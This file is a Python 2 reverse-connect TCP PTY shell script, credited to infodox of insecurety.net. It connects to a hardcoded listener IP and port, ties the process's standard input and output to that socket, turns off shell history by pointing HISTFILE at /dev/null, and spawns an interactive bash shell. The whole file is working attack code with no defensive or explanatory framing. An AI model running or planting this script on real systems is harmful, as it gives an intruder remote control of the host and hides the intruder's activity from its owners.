#!/usr/bin/python2
"""
Reverse Connect TCP PTY Shell - Python 2 Version
infodox - insecurety.net (2013)
"""

import os
import pty
import socket

lhost = "10.10.16.18"  # Change this to your listener IP
lport = 9999        # Change this to your listener port

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()
